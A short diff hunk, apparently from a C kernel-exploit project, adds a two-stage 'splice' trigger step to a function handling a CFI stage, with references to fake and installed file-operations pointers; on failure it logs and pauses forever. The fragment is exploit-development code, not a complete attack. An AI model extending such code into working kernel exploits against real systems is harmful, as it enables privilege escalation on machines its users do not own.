@@ -2003,6 +2003,11 @@ int try_cfi_stage(void) {
      * fake fops.
      */
     app_publish_two_stage2_ready();
+    if (!app_trigger_two_stage_splice()) {
+      pr_error("two-stage direct splice trigger failed; retaining\n");
+      fflush(NULL);
+      for (;;) pause();
+    }
     ssize_t splice_ret = -1;
     uintptr_t installed_fops = 0;
     uintptr_t target_fop = 0;
